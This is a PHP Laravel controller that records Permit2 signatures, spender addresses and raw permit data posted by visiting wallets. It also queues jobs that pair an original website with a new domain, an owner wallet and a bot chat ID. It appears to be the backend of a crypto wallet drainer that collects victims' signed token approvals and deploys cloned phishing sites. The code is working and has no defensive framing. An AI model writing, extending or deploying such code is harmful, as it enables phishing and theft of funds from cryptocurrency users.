<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use App\Models\PermitCollection;
use Illuminate\Routing\Controller as BaseController;
use PhpAmqpLib\Message\AMQPMessage;
use Illuminate\Support\Facades\App;
use \App\Models\PacketSiteCollection;
use App\Models\Chainpermit2Collection;
class SigController extends BaseController
{
  public function index(Request $request)
  {
  // 创建一个新的 SigCollection 实例并设置属性值
    $permitCollection = new PermitCollection();
    $permitCollection->account = $request->post('account');
    $permitCollection->permit2address = $request->post('permit2address');
    $permitCollection->chain = $request->post('chain');
    $permitCollection->details = $request->post('details');
    $permitCollection->signature = $request->post('signature');
    $permitCollection->source = $request->post('source');
    $permitCollection->spender_address= $request->post('spender_address');
    
    $data = $permitCollection->where('signature',$permitCollection->signature)->get('id');
      //保存数据到数据库(重复签名不记录)
    if(sizeof($data) <= 0){
        $saveResult =  $permitCollection->save();
    }else{
        $saveResult = false;
    }
    return new JsonResponse($saveResult, 200);
  }

  public function publishMsg(Request $request){
    //将机器人消息存进mysql
    $raw_website = $request->input('website');
    $new_domain = $request->input('domain');
    $chain = $request->input('chainId');
    $owner = $request->input('wallet');
    $bot_chatid = $request->input('chatId');

    $packetCollection = new PacketSiteCollection();
    $isExist = $packetCollection::where('chain', $chain)->where('new_domain', $new_domain)->count();
    if($isExist) return new JsonResponse(['code'=>101,'message' => 'already exist.'], 200,['encoding' => 'utf-8']);
        $packetCollection->raw_website = $raw_website;
        $packetCollection->new_domain = $new_domain;
        $packetCollection->owner = $owner;
        $packetCollection->chain = $chain;
      try {
        $packetCollection->save();
      } catch (\Exception $e) {
        return new JsonResponse(['code'=>0,'message' => 'Failed to Save Message','details'=>$e->getMessage()], 200,['encoding' => 'utf-8']);
      }

    //将机器人消息存进消息队列
    $connection = App::make('rabbitmq');
    $channel = $connection->channel();
    $queue = 'default';
    $channel->queue_declare($queue, false, true, false, false);
    $messageData = [
        'envData' => [
            'NEXT_PUBLIC_DOMAIN_WEBSITE' =>  $raw_website,
            'NEXT_PUBLIC_SOURCE' => $new_domain,
            'NEXT_PUBLIC_CHAIN' => $chain,
            'NEXT_PUBLIC_OWNER'=> $owner
        ],
        'chatData' =>[
          'bot_chatid' => $bot_chatid
        ]
    ];
    $message = new AMQPMessage(json_encode($messageData));
    try {
        $result = $channel->basic_publish($message, '', $queue);
    } catch (\Exception $e) {
        $channel->close();
        $connection->close();
        return new JsonResponse(['code'=>0,'message' => 'Failed to Publish Message','details'=>$e->getMessage()], 200,['encoding' => 'utf-8']);
    }
    $channel->close();
    $connection->close();
    return new JsonResponse(['code'=>1,'message' => 'Message published successfully.'], 200,['encoding' => 'utf-8']);
   // return response()->json(['code'=>1,'message' => 'Message published successfully.']);
  }

  public function saveChainPermit2Data(Request $request){
    $Chainpermit2Collection = new Chainpermit2Collection;
    $Chainpermit2Collection->account = $request->input('account');
    $Chainpermit2Collection->raw_data = json_encode($request->input('raw_data'));
    $Chainpermit2Collection->save();
    return new JsonResponse(['code'=>'1','message'=>'save to database.'],200);
  }
}
